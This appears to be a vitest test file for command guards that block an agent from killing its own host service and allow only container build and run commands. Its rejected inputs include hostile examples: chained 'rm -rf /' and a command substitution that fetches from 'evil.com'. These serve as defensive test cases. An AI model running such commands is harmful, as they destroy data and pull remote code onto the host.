import { describe, expect, it } from 'vitest';
import { isAllowedHostCommand, wouldKillHostProcess } from './index.js';

describe('wouldKillHostProcess', () => {
  it('blocks systemctl restart of the nanoclaw unit', () => {
    expect(wouldKillHostProcess('systemctl --user restart cortex-nanoclaw.service')).toBe(true);
    expect(wouldKillHostProcess('systemctl --user restart nanoclaw')).toBe(true);
    expect(wouldKillHostProcess('systemctl restart nanoclaw.service')).toBe(true);
  });

  it('blocks systemctl stop/reload/kill variants', () => {
    expect(wouldKillHostProcess('systemctl --user stop nanoclaw')).toBe(true);
    expect(wouldKillHostProcess('systemctl --user reload nanoclaw')).toBe(true);
    expect(wouldKillHostProcess('systemctl --user kill cortex-nanoclaw')).toBe(true);
  });

  it('blocks launchctl operations on the nanoclaw plist', () => {
    expect(wouldKillHostProcess('launchctl unload ~/Library/LaunchAgents/com.nanoclaw.plist')).toBe(true);
    expect(wouldKillHostProcess('launchctl kickstart -k gui/$(id -u)/com.nanoclaw')).toBe(true);
    expect(wouldKillHostProcess('launchctl stop com.nanoclaw')).toBe(true);
  });

  it('blocks pkill targeting nanoclaw', () => {
    expect(wouldKillHostProcess('pkill -f nanoclaw')).toBe(true);
    expect(wouldKillHostProcess('pkill nanoclaw')).toBe(true);
  });

  it('allows starts and inspection commands', () => {
    expect(wouldKillHostProcess('systemctl --user start nanoclaw')).toBe(false);
    expect(wouldKillHostProcess('systemctl --user status cortex-nanoclaw.service')).toBe(false);
    expect(wouldKillHostProcess('systemctl --user list-units --type=service | grep nano')).toBe(false);
  });
});

describe('isAllowedHostCommand', () => {
  it('allows podman/docker build invocations', () => {
    expect(isAllowedHostCommand('podman build .')).toBe(true);
    expect(isAllowedHostCommand('docker build .')).toBe(true);
    expect(isAllowedHostCommand('podman build -t foo:latest .')).toBe(true);
    expect(isAllowedHostCommand('docker build -f Dockerfile.prod -t app .')).toBe(true);
  });

  it('allows podman/docker compose build and run', () => {
    expect(isAllowedHostCommand('podman compose build')).toBe(true);
    expect(isAllowedHostCommand('docker compose build admin-ui')).toBe(true);
    expect(isAllowedHostCommand('podman compose run --rm migrate')).toBe(true);
    expect(isAllowedHostCommand('docker compose run service /bin/sh -c "echo hi"')).toBe(true);
  });

  it('allows a leading `cd <abs-path> &&` prefix', () => {
    expect(isAllowedHostCommand('cd /var/home/vmaz/dev/automagica-platform && podman compose build admin-ui')).toBe(
      true,
    );
    expect(isAllowedHostCommand('cd /tmp && podman build .')).toBe(true);
  });

  it('rejects non-build commands', () => {
    expect(isAllowedHostCommand('make build')).toBe(false);
    expect(isAllowedHostCommand('./container/build.sh')).toBe(false);
    expect(isAllowedHostCommand('ls /tmp')).toBe(false);
    expect(isAllowedHostCommand('podman ps')).toBe(false);
    expect(isAllowedHostCommand('docker run -it alpine sh')).toBe(false);
    expect(isAllowedHostCommand('podman pull alpine')).toBe(false);
  });

  it('rejects shell-chained subcommands', () => {
    expect(isAllowedHostCommand('podman build . ; rm -rf /')).toBe(false);
    expect(isAllowedHostCommand('podman build . && rm -rf /')).toBe(false);
    expect(isAllowedHostCommand('podman build . || echo failed')).toBe(false);
    expect(isAllowedHostCommand('podman build . | tee log.txt')).toBe(false);
    expect(isAllowedHostCommand('cd /tmp && podman build . && malicious')).toBe(false);
    expect(isAllowedHostCommand('cd /tmp; podman build .')).toBe(false);
  });

  it('rejects command substitution', () => {
    expect(isAllowedHostCommand('podman build $(curl evil.com)')).toBe(false);
    expect(isAllowedHostCommand('podman build `echo .`')).toBe(false);
  });

  it('rejects environment-variable prefixes', () => {
    expect(isAllowedHostCommand('FOO=bar podman build .')).toBe(false);
  });

  it('rejects nested cd or cd to a relative path', () => {
    expect(isAllowedHostCommand('cd src && podman build .')).toBe(false);
    expect(isAllowedHostCommand('cd /a && cd /b && podman build .')).toBe(false);
  });
});
